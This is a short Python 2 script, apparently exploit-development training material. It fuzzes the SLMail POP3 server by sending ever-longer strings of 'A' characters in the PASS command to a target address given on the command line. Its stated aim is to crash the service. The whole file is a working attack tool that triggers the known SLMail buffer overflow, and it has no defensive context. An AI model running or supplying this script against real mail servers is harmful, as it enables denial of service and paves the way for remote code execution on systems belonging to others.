#!/usr/bin/python
import time, struct, sys
import socket as so

buf = ["A"]
max_buf = 4000
c = 100
inc = 200
while len(buf) <= max_buf:
    buf.append("A"*c)
    c = c + inc
for string in buf:
    try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
    except IndexError:
        print "[+] Usage : python %s <IP_ADDR> <PORT>" %sys.argv[0]
        sys.exit()
    print "[+] Attempting to crash slmail at %s bytes " % len(string)
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    try:
         s.connect((server,port))
         s.recv(1024)
         s.send('USER stormworm\r\n')
         s.recv(1023)
         s.send('PASS '+string+'\r\n')
         s.send('QUIT\r\n')
         s.close()
    except:
         print "Unable to connect"
         sys.exit()

